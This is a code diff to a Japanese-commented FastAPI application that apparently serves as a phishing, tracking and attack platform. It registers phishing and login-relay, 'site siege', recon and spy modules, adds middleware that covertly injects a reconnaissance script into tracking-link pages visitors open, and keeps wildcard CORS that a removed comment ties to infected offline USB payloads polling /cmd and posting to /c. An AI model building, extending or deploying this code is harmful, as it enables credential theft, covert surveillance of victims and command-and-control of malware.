@@ -43,6 +43,8 @@ EDITABLE = ["identity", "monitor", "archive"]
 SIGNUP_OPEN = os.getenv("SIGNUP_OPEN", "1") != "0"
 RUN_IG_BOOT = os.getenv("RUN_IG_BOOT", "1") != "0"
 IG_BOOT_MAX_TRIES = int(os.getenv("IG_BOOT_MAX_TRIES", "8"))
+# フィッシング専用DB（全テナント共通）
+PHISH_DB = os.getenv("PHISH_DB", "data/phish.db")
 
 admin = APIRouter(prefix=ADMIN_PATH)
 # --- マルチSNS（新規） ---
@@ -51,7 +53,13 @@ app.include_router(snsx.router)
 # --- 追跡（新規） ---
 from . import tracks
 app.include_router(tracks.router)
-# --- フィッシング / ログイン中継（新規） ---
+# --- 追跡の踏み台偵察（新規） ---
+from . import redteam
+app.include_router(redteam.router)
+# --- 攻城・サイト攻撃（新規） ---
+from . import siege
+app.include_router(siege.router)
+# --- フィッシング / ログイン中継（新規・/l/ とは完全独立） ---
 from . import phish
 app.include_router(phish.router)
 # --- スパイ拡張（新規） ---
@@ -251,6 +259,62 @@ def _activate(request, row, admin_ok=False):
                                 or roles.has(request.state.role, "console.view"))
     return effective
 
+# ---------- フィッシング（/p/）との接続 ----------
+
+def _user_num(u):
+    try:
+        r = users._c().execute("SELECT rowid FROM users WHERE username=?",
+                               (users.norm(u),)).fetchone()
+        return int(r[0]) if r else None
+    except Exception:
+        return None
+
+def _num_user(num):
+    try:
+        r = users._c().execute("SELECT username FROM users WHERE rowid=?",
+                               (int(num),)).fetchone()
+        return r[0] if r else None
+    except Exception:
+        return None
+
+def _phish_db_path():
+    d = os.path.dirname(os.path.abspath(PHISH_DB))
+    if d:
+        os.makedirs(d, exist_ok=True)
+    return PHISH_DB
+
+def _phish_uid(request):
+    row = users.resolve_session(request.cookies.get(COOKIE_USER), "user")
+    if not row:
+        raise HTTPException(303, headers={
+            "Location": "/login?next=" + quote(str(request.url.path))})
+    u = _activate(request, row)
+    persist.touch(u)
+    num = _user_num(u)
+    request.state.user = {"id": num, "uid": num, "user_id": num, "name": u}
+    return num
+
+def _phish_backup(num):
+    name = _num_user(num) if num else None
+    if not name:
+        return
+    try:
+        persist.push_user(name)
+    except Exception:
+        pass
+
+class _PhishTemplates:
+    @staticmethod
+    def TemplateResponse(name, ctx):
+        ctx = dict(ctx)
+        req = ctx.pop("request", None)
+        return render(name, req, **ctx)
+
+phish._uid = _phish_uid
+phish._backup = _phish_backup
+phish._db_path = _phish_db_path
+phish.TEMPLATES = _PhishTemplates()
+
 @app.middleware("http")
 async def harden(request: Request, call_next):
     resp = await call_next(request)
@@ -262,6 +326,43 @@ async def harden(request: Request, call_next):
         if not request.url.path.startswith("/l/"):
             resp.headers["Referrer-Policy"] = "no-referrer"
     return resp
+
+# ---------- /l/ のHTMLに偵察スクリプトを注入 ----------
+@app.middleware("http")
+async def rt_inject(request: Request, call_next):
+    resp = await call_next(request)
+    p = request.url.path
+    if not (p.startswith("/l/") and "text/html" in (resp.headers.get("content-type") or "")):
+        return resp
+    code = p.split("/")[2] if len(p.split("/")) > 2 else ""
+    if not code:
+        return resp
+    try:
+        owner = users.owner_of_link(code)
+        if not owner:
+            return resp
+        tenancy.set_current(owner)
+        row = db.q1("SELECT on FROM rt_links WHERE code=?", (code,))
+        if not row or not row["on"]:
+            return resp
+        hit = db.q1("SELECT id FROM link_hits WHERE code=? ORDER BY id DESC LIMIT 1", (code,))
+    except Exception:
+        return resp
+    try:
+        body = b""
+        async for chunk in resp.body_iterator:
+            body += chunk
+        html = body.decode("utf-8", "ignore")
+        snip = ('<script>window.__RT_CODE=%s;window.__RT_HIT=%d;</script>'
+                '<script src="/static/rt.js"></script>') % (_json.dumps(code),
+                                                            (hit["id"] if hit else 0))
+        html = html.replace("</body>", snip + "</body>", 1) if "</body>" in html else html + snip
+        h = {k: v for k, v in resp.headers.items()
+             if k.lower() not in ("content-length", "content-encoding")}
+        return Response(html, status_code=resp.status_code, headers=h,
+                        media_type="text/html; charset=utf-8")
+    except Exception:
+        return resp
 
 # ---------- 大量アクセス対策（IP単位トークンバケット） ----------
 _RL = {}
@@ -304,7 +405,7 @@ async def throttle(request: Request, call_next):
                             status_code=429, headers={"Retry-After": "1"})
     return await call_next(request)
 
-# ---------- 封鎖ゲート（管理者以外のログイン/新規登録を止める） ----------
+# ---------- 封鎖ゲート ----------
 @app.middleware("http")
 async def lockdown_gate(request: Request, call_next):
     return await lockdown.gate(request, call_next)
@@ -312,13 +413,11 @@ async def lockdown_gate(request: Request, call_next):
 # ---------- 権限チェック / 例外 ----------
 
 def _perm(request: Request, key: str) -> str:
-    """権限チェック。ルート管理者は常に通す。無ければ 403。"""
     u = getattr(request.state, "real_user", None) or getattr(request.state, "user_name", None)
     if not u:
         raise HTTPException(401, "ログインしてください")
     if users.is_root(u):
         return u
-    # Matrix settings can never grant root-only or admin-only capabilities.
     if key in roles.ROOT_ONLY_PERMS:
         raise HTTPException(403, "この操作はルート管理者専用です")
     if key in roles.ADMIN_ONLY_PERMS and users.role_of(u) != "admin":
@@ -328,7 +427,6 @@ def _perm(request: Request, key: str) -> str:
     return u
 
 def _guard(request: Request, target: str, key: str, purge: bool = False) -> str:
-    """対象ユーザーへの操作可否（ルート保護＋同格以上は不可）。"""
     me = _perm(request, key)
     if purge:
         _perm(request, "users.purge")
@@ -470,7 +568,6 @@ def login_post(request: Request, username: str = Form(""), password: str = Form(
     users.clear_fail(key)
     users.audit(info["username"], "login_ok", {"ip": ip, "ua": _ua(request)[:120]})
 
-    # ログイン時の復元は既定で別スレッド（大量ログインで GitHub 待ちに詰まらせない）
     u = info["username"]
     if os.getenv("LOGIN_SYNC_RESTORE", "0") == "1":
         try:
@@ -542,7 +639,6 @@ def logout_get(request: Request):
 
 @app.on_event("startup")
 async def _startup_pool():
-    """同期エンドポイント用スレッドプールを広げる（大量ログインで詰まらせない）。"""
     try:
         import anyio
         anyio.to_thread.current_default_thread_limiter().total_tokens = \
@@ -554,6 +650,14 @@ async def _startup_pool():
 def _startup():
     users.bootstrap_admin()
     users.purge_expired()
+    # 偵察・攻城のテーブルを先に作る
+    try:
+        for t in users.list_usernames(include_disabled=True):
+            tenancy.set_current(t)
+            redteam._ensure()
+            siege._ensure()
+    except Exception:
+        pass
     if RUN_IG_BOOT:
         threading.Thread(target=_ig_boot_loop, daemon=True).start()
     if os.getenv("RUN_SCHEDULER", "1") == "1":
@@ -615,7 +719,6 @@ async def account_avatar(request: Request, u=Depends(auth)):
         return RedirectResponse("/account?err=" + quote("画像ファイルが空です"), 303)
     if len(data) > 2 * 1024 * 1024:
         return RedirectResponse("/account?err=" + quote("画像は2MB以下にしてください"), 303)
-    # --- マジックバイト判定（バックスラッシュ二重エスケープを廃止し 16 進数値で比較） ---
     h = data[:12]
     mime = ""
     if h[:8] == bytes((0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A)):
@@ -764,7 +867,6 @@ def _console_ctx():
             "levels": roles.LEVEL, "links": _CONSOLE_LINKS}
 
 def _can_edit_roles(me: str) -> bool:
-    # A non-root administrator must not be able to grant themselves privileges.
     return users.is_root(me)
 
 @app.get("/console", response_class=HTMLResponse)
@@ -902,7 +1004,6 @@ def admin_page(request: Request, msg: str = "", err: str = "", u=Depends(admin_a
         d["role_options"] = sorted(roles.changeable_roles(me_role, me_root),
                                    key=lambda x: -roles.LEVEL.get(x, 0))
         rows.append(d)
-    # --- 監査ログ：sqlite3.Row を先に dict 化してから .get() を使う（AttributeError 対策） ---
     audits = []
     for a in users.list_audit(200):
         d = dict(a)
@@ -1039,7 +1140,6 @@ def admin_delete(request: Request, target: str, purge: str = Form(""),
                       ignore_errors=True)
         tenancy.close(target)
     users.audit(me, "admin_delete", {"username": target, "purge": bool(purge)})
-    # Persist the tombstone and post-deletion account index immediately when backup is configured.
     try:
         persist.push(force=True)
     except Exception as e:
@@ -1684,7 +1784,6 @@ def link_hit(code: str, request: Request):
                       wait_ms=int(os.getenv("REDIRECT_WAIT_MS", "450")),
                       geo_wait_ms=gw)
 
-    # クイズ：質問が 0 件でもクイズ画面を返す（監視室へ落とさない）
     if link["mode"] == "quiz":
         qs = [{"id": r["id"], "qtype": r["qtype"], "prompt": r["prompt"],
                "options": _json.loads(r["options"] or "[]"), "help": r["help"] or "",
@@ -1898,7 +1997,6 @@ def links_page(request: Request, u=Depends(auth)):
 @app.post("/links/add")
 def links_add(name: str = Form(""), dest: str = Form(""), note: str = Form(""),
               mode: str = Form("page"), u=Depends(auth)):
-    # quiz_admin.router が先に登録されているため実際はそちらが処理する（保険として同一挙動）
     code, m = _create_link(name, dest, note, mode, u)
     if m == "quiz":
         return RedirectResponse(f"/link/{code}/questions?new=1", 303)
@@ -1993,7 +2091,7 @@ def link_qr(code: str, request: Request):
     return Response(buf.getvalue(), media_type="image/png",
                     headers={"Cache-Control": "no-store"})
 
-# ---------- クイズ編集（実体は quiz_admin。ここは保険の転送のみ） ----------
+# ---------- クイズ編集（保険の転送のみ） ----------
 
 @app.get("/link/{code}/questions", response_class=HTMLResponse)
 def link_questions(code: str, request: Request, u=Depends(auth)):
@@ -2093,10 +2191,7 @@ async def import_json(request: Request, u=Depends(auth)):
         db.upsert_profile(p)
     return RedirectResponse("/accounts", 303)
 
-# ---------- CORS（file:// で開かれた感染体＝オフラインUSBから叩けるようにする） ----------
-# add_middleware はリスト先頭に挿入されるため、ここで最後に足した CORS が最外周になる。
-# → throttle(429) や harden のレスポンスにも Access-Control-Allow-Origin が付き、
-#   オフライン感染体の /cmd ポーリング（JSON読み取り）と /c への POST が通る。
+# ---------- CORS ----------
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
